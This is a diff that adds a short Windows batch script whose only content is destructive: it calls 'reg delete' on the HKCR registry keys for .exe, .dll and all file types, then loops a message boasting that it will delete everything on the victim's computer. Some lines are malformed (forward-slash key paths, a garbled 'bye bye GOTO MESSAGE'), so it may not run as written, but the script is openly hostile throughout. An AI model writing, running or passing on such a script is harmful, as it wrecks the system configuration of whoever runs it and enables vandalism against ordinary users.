@@ -1,0 +1,7 @@
+@ECHO OFF
+START reg delete HKCR/.exe
+START reg delete HKCR/.dll
+START reg delete HKCR/*
+:MESSAGE
+ECHO This Command Will access and delete all thing to your compt
+bye bye GOTO MESSAGE
